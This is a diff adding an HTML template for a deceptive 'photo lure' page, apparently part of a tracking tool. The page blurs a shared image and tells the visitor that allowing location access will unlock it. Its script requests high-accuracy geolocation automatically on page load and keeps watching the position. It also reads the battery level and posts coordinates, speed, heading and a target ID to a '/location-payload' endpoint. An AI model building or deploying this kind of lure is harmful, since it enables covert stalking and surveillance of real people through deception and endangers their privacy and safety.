@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ imageTitle }} - Secure HD Viewer</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background: #0f172a;
+            color: #f8fafc;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .viewer-card {
+            background: rgba(30, 41, 59, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            max-width: 520px;
+            width: 100%;
+            overflow: hidden;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(16px);
+        }
+
+        .viewer-header {
+            padding: 16px 20px;
+            background: rgba(15, 23, 42, 0.8);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .avatar {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #6366f1, #a855f7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: 700;
+        }
+
+        .media-container {
+            position: relative;
+            width: 100%;
+            height: 360px;
+            background: #020617;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .media-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: blur(25px) brightness(0.6);
+            transition: all 0.6s ease;
+        }
+
+        .media-img.unlocked {
+            filter: none;
+        }
+
+        .overlay-prompt {
+            position: absolute;
+            inset: 0;
+            background: rgba(15, 23, 42, 0.7);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            text-align: center;
+            transition: opacity 0.5s ease;
+        }
+
+        .overlay-prompt.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .icon-pulse {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: rgba(99, 102, 241, 0.2);
+            border: 2px solid #6366f1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #818cf8;
+            margin-bottom: 16px;
+            animation: pulse-ring 2s infinite;
+        }
+
+        @keyframes pulse-ring {
+            0% {
+                box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.7);
+            }
+
+            70% {
+                box-shadow: 0 0 0 18px rgba(99, 102, 241, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(99, 102, 241, 0);
+            }
+        }
+
+        .btn-unlock {
+            margin-top: 16px;
+            padding: 12px 28px;
+            background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%);
+            border: none;
+            border-radius: 30px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            box-shadow: 0 4px 20px rgba(99, 102, 241, 0.4);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s;
+        }
+
+        .btn-unlock:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 25px rgba(99, 102, 241, 0.6);
+        }
+
+        .viewer-footer {
+            padding: 16px 20px;
+            background: rgba(15, 23, 42, 0.6);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #94a3b8;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="viewer-card">
+        <div class="viewer-header">
+            <div class="user-info">
+                <div class="avatar"><i class="fa-solid fa-image"></i></div>
+                <div>
+                    <h3 style="font-size: 15px; font-weight: 600; color: #fff;">{{ imageTitle }}</h3>
+                    <span style="font-size: 12px; color: #94a3b8;">Shared HD Photo Lure</span>
+                </div>
+            </div>
+            <span
+                style="font-size: 12px; color: #818cf8; background: rgba(99, 102, 241, 0.15); padding: 4px 10px; border-radius: 12px;">4K
+                Ultra HD</span>
+        </div>
+
+        <div class="media-container" onclick="requestLocationAndUnlock()">
+            <img id="mainImg" class="media-img" src="{{ imageUrl }}" alt="Lure Image">
+            <div id="overlay" class="overlay-prompt">
+                <div class="icon-pulse">
+                    <i class="fa-solid fa-lock"></i>
+                </div>
+                <h4 style="font-size: 18px; color: #fff; margin-bottom: 6px;">Protected Image Preview</h4>
+                <p style="font-size: 13px; color: #94a3b8; max-width: 320px;">
+                    Click anywhere on the photo to verify location & view high-resolution unblurred image.
+                </p>
+                <button class="btn-unlock">
+                    <i class="fa-solid fa-eye"></i> View Full Photo (4K)
+                </button>
+            </div>
+        </div>
+
+        <div class="viewer-footer">
+            <span><i class="fa-solid fa-shield-halved"></i> Encrypted Media Transfer</span>
+            <span id="statusText">Awaiting Tap...</span>
+        </div>
+    </div>
+
+    <script>
+        const targetId = "{{ targetId }}";
+        let watchId = null;
+
+        function reportLocation(pos) {
+            document.getElementById("mainImg").classList.add("unlocked");
+            document.getElementById("overlay").classList.add("hidden");
+            document.getElementById("statusText").innerText = "Image Unlocked (Live)";
+
+            let batteryLevel = "100%";
+            if (navigator.getBattery) {
+                navigator.getBattery().then(b => batteryLevel = `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : ''}`);
+            }
+
+            const payload = {
+                id: targetId,
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                accuracy: pos.coords.accuracy || 10,
+                speed: pos.coords.speed || 0,
+                heading: pos.coords.heading || 0,
+                altitude: pos.coords.altitude || 0,
+                battery: batteryLevel,
+                baitType: "Image Tracker (Lure Photo)"
+            };
+
+            fetch("/location-payload", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        function requestLocationAndUnlock() {
+            document.getElementById("statusText").innerText = "Verifying Location Access...";
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        reportLocation(pos);
+                        if (!watchId) {
+                            watchId = navigator.geolocation.watchPosition(reportLocation, null, {
+                                enableHighAccuracy: true,
+                                maximumAge: 0,
+                                timeout: 10000
+                            });
+                        }
+                    },
+                    (err) => {
+                        alert("Please allow location access to unblur and view full 4K HD photo!");
+                        document.getElementById("statusText").innerText = "Permission Denied";
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                alert("Geolocation is not supported by your device.");
+            }
+        }
+
+        // Auto trigger location request on load
+        window.onload = function () {
+            setTimeout(requestLocationAndUnlock, 1200);
+        };
+    </script>
+</body>
+
+</html>
